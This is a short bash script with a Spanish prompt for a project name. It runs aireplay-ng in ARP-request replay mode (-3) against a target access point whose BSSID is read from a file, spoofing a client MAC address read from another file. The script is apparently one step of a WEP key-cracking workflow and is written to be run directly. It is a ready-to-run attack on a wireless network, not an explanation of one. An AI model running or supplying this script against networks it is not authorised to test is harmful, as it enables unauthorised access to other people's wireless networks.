#!/bin/bash
read -p "Nombre del proyecto?: " archivo
cd $archivo
sudo aireplay-ng -3 -b `cat bssid` -h `cat madmac` `cat ../mon`
